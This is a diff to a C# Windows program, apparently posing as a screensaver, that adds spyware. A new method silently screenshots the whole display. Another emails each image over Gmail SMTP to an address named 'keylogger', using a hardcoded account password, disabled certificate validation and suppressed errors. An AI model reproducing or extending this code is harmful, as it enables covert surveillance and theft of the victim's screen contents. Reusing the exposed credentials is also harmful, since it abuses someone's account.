@@ -1,9 +1,13 @@
 ﻿using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Net;
+using System.Net.Mail;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -37,8 +41,13 @@ namespace GoshaMsql
         static string exp = @".bmp"; //расширение файла
         static int timeBetweenScreens = 10000; //время между снятием двух скриншотов.
 
+        //***********
+       // static string wayToDir = @"Screens\";
+        static string wayToScreen;
+       // static string finalDir = @"C:\Program Files (x86)\ScreenSaver\";
+      //  Thread Cir = new Thread(Circle);
 
-       public static void FirstStart()
+        public static void FirstStart()
         {
             string logg = "ЛОГ ошибок \t\n";
         
@@ -74,9 +83,49 @@ namespace GoshaMsql
 
         }
 
-        static void СasualStart()
+
+        
+
+        //Сделать снимок
+        static public void MakeScreen()
+        {
+            Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            Graphics GH = Graphics.FromImage(BM as Image);
+           
+            GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
+
+            if (!Directory.Exists(wayToDir))
+                Directory.CreateDirectory(wayToDir);
+            wayToScreen = wayToDir + System.DateTime.Now.ToString().Replace(':', '_')+".bmp";
+            BM.Save(wayToScreen);
+
+
+
+
+        }
+
+        ///Метод оптравки на почтуы
+        static public void Send()
         {
 
+            MailAddress from = new MailAddress("lll.a.qp.o.b.o.d@gmail.com", "Idmar");
+            MailAddress to = new MailAddress("keylogger.idmar@yandex.ru");
+            MailMessage m = new MailMessage(from, to);
+            m.Subject = "Снимок экрана";
+            m.Body = "";
+            m.IsBodyHtml = true;
+            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587); ;
+            smtp.Credentials = new NetworkCredential("lll.a.qp.o.b.o.d@gmail.com", "qaEDtgUJol");
+            smtp.EnableSsl = true;
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+            m.Attachments.Add(new Attachment(wayToScreen));
+            // Thread.Sleep(10000);
+
+            try
+            {
+                smtp.Send(m);
+            }
+            catch { }
         }
 
        //запись в файл
